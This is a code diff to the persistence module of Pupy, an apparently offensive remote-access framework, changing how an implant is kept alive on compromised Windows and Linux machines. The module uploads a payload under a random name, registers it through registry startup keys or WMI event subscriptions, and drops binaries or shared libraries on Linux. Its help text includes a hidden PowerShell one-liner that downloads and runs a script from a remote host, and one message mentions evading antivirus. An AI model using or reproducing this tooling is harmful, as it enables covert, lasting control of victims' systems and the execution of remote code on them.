@@ -15,7 +15,6 @@
 # --------------------------------------------------------------
 from pupylib.PupyModule import *
 from pupylib.PupyCompleter import *
-from modules.lib.linux.migrate import get_payload
 import random
 import pupygen
 import os.path
@@ -27,9 +26,24 @@ __class_name__="PersistenceModule"
 @config(cat="manage", compat=['linux', 'windows'])
 class PersistenceModule(PupyModule):
     """ Enables persistence via registry keys """
+
+    dependencies = {
+        'linux': [ 'persistence' ],
+        'windows': [ 'pupwinutils.persistence' ]
+    }
+
     def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__)
-        self.arg_parser.add_argument('-e','--exe', help='Use an alternative file and set persistency', completer=path_completer)
+        example = 'Examples:\n'
+        example += '>> run persistence -c "powershell.exe -w hidden -noni -nop -c \\\"iex(New-Object System.Net.WebClient).DownloadString(\'http://192.168.0.15:8080/eiloShaegae1\')\\\""\n'
+        example += '>> run persistence -e \'/tmp/pupy.exe\' -m wmi\n'
+        example += '>> run persistence -m wmi --remove\n'
+        self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__, epilog=example)
+        self.arg_parser.add_argument('-e', '--exe', help='Use an alternative file and set persistency', completer=path_completer)
+        self.arg_parser.add_argument('-c', '--cmd', help='Use a command instead of a file')
+        self.arg_parser.add_argument('-s', '--shared', action='store_true', default=False,
+                                         help='prefer shared object')
+        self.arg_parser.add_argument('--remove', action='store_true', help='try to remove persistency instead of enabling it')
+        self.arg_parser.add_argument('-m', '--method', choices=['registry', 'wmi'], default='registry', help='change the default persistency method. This argument is ignored on linux')
 
     def run(self, args):
         if self.client.is_windows():
@@ -38,52 +52,102 @@ class PersistenceModule(PupyModule):
             self.linux(args)
 
     def linux(self, args):
-        self.client.load_package('persistence')
+        if args.remove:
+            #TODO persistency removal
+            self.error("not implemented for linux")
+            return
         manager = self.client.conn.modules['persistence'].DropManager()
-        self.info('Available methods: {}'.format(manager.methods))
-        payload = get_payload(self, compressed=False)
-        drop_path, conf_path = manager.add_library(payload)
+        self.success('Available methods: ' + ', '.join(
+            method for method,state in manager.methods.iteritems() if state is True
+        ))
+
+        for method, result in manager.methods.iteritems():
+            if result is not True:
+                self.error('Unavailable method: {}: {}'.format(method, result))
+
+        exebuff, tpl, _ = pupygen.generate_binary_from_template(
+            self.client.get_conf(),
+            self.client.desc['platform'],
+            arch=self.client.arch,
+            shared=args.shared
+        )
+
+        self.success("Generating the payload with the current config from {} - size={}".format(
+            tpl, len(exebuff)))
+
+        if args.shared:
+            drop_path, conf_path = manager.add_library(exebuff)
+        else:
+            drop_path, conf_path = manager.add_binary(exebuff)
+
         if drop_path and conf_path:
             self.success('Dropped: {} Config: {}'.format(drop_path, conf_path))
         else:
             self.error('Couldn\'t make service persistent.')
 
     def windows(self, args):
+        if args.remove:
+            # removing persistency from registry
+            if args.method=="registry":
+                self.info("removing persistence from registry ...")
+                if self.client.conn.modules['pupwinutils.persistence'].remove_registry_startup():
+                    self.info("persistence removed !")
+                else:
+                    self.error("error removing registry persistence")
+
+            # removing persistency from wmi event
+            elif args.method=="wmi":
+                self.info("removing wmi event ...")
+                if (self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System") or self.client.conn.modules['sys'].getwindowsversion()[0] < 6:
+                    self.warning("You seems to lack some privileges to remove wmi persistence ...")
+                if self.client.conn.modules['pupwinutils.persistence'].remove_wmi_persistence():
+                    self.success("persistence removed !")
+                else:
+                    self.error("error removing wmi persistence")
+            return
+
         exebuff=b""
+        cmd=None
+        remote_path=None
         if args.exe:
             with open(args.exe,'rb') as f:
                 exebuff=f.read()
             self.info("loading %s ..."%args.exe)
+            remote_path=self.client.conn.modules['os.path'].expandvars("%ProgramData%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
+            self.info("uploading to %s ..."%remote_path)
+            #uploading
+            rf=self.client.conn.builtin.open(remote_path, "wb")
+            chunk_size=16000
+            pos=0
+            while True:
+                buf=exebuff[pos:pos+chunk_size]
+                if not buf:
+                    break
+                rf.write(buf)
+                pos+=chunk_size
+            rf.close()
+            self.success("upload successful")
+            cmd = remote_path
+        elif args.cmd:
+            cmd = args.cmd
         else:
-            #retrieving conn info
-            res=self.client.conn.modules['pupy'].get_connect_back_host()
-            host, port=res.rsplit(':',1)
-            #generating exe
-            self.info("generating exe ...")
-            if self.client.desc['proc_arch']=="64bit":
-                exebuff=pupygen.get_edit_pupyx64_exe(self.client.get_conf())
+            self.error("A command line or an executable is needed on windows (standard templates will get caught by the AV)")
+            return
+
+
+        if args.method=="registry":
+            # adding persistency in registry (for xp, it will always be in registry)
+            self.info("adding to registry ...")
+            if self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(cmd):
+                self.success("persistence added in registry !")
             else:
-                exebuff=pupygen.get_edit_pupyx86_exe(self.client.get_conf())
-
-        self.client.load_package("pupwinutils.persistence")
-        remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
-        self.info("uploading to %s ..."%remote_path)
-        #uploading
-        rf=self.client.conn.builtin.open(remote_path, "wb")
-        chunk_size=16000
-        pos=0
-        while True:
-            buf=exebuff[pos:pos+chunk_size]
-            if not buf:
-                break
-            rf.write(buf)
-            pos+=chunk_size
-        rf.close()
-        self.success("upload successful")
-
-        #adding persistency
-        self.info("adding to registry ...")
-        self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(remote_path)
-        self.info("registry key added")
-
-        self.success("persistence added !")
+                self.error("an error occured creating the registry persistence, try to do it manually")
+            # adding persistency using wmi event
+        elif args.method=="wmi":
+            if (self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System") or self.client.conn.modules['sys'].getwindowsversion()[0] < 6:
+                self.warning("You seems to lack some privileges to remove wmi persistence ...")
+            self.info("creating wmi event ...")
+            if self.client.conn.modules['pupwinutils.persistence'].wmi_persistence(command=cmd, file=remote_path):
+                self.success("persistence added using wmi!")
+            else:
+                self.error("an error occured creating the wmi persistence, try to do it manually")
